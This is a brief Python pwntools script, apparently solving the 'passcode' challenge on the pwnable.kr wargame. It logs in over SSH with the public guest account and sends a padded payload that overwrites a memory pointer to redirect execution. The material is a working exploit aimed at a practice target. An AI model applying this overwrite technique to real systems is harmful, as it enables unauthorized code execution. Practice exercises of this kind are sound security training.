from pwn import *

s = ssh(host="pwnable.kr", user="passcode", password="guest", port=2222)
p = s.process('./passcode')

p.sendline(96 * b'a' + p32(0x804a004) + bytes(str(0x080485d7), 'utf-8'))

p.interactive()
